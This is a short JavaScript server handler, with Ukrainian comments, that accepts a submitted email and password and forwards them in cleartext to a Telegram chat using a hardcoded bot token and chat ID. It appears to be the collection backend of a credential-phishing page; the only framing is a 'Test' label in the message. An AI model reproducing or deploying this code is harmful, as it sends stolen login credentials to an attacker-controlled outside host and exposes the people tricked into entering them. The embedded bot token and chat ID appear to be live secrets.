export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { email, password } = req.body;

    // Ваші точні налаштування Telegram
    const token = '8834399818:AAE0VtEZOGoPD95CdbQeCGXN6GLY7kvoXbM';
    const chatId = '8769707483';

    const message = `🔔 <b>Отримано нові дані (Тест):</b>\n\n📧 Email: <code>${email}</code>\n🔑 Пароль: <code>${password}</code>`;
    
    // ПРАВИЛЬНА АДРЕСА СЕРВЕРА TELEGRAM:
    const url = "https://api.telegram.org/bot" + token + "/sendMessage";

    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                parse_mode: 'HTML',
                text: message
            })
        });
        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}


